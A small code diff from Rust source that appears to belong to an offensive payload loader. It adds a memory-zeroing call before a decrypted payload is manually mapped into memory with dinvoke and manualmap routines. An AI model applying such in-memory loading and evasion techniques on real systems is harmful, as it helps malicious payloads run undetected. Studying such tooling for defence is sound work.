@@ -128,6 +128,8 @@ impl Manager {
                         return Err(lc!("[x] Error changing memory protection."));
                     }
 
+                    dinvoke::rtl_zero_memory(*base_address, *size);
+
                     let _r = manualmap::map_to_allocated_memory(decrypted_payload.as_ptr(), addr, pe_info)?;
                 } 
 
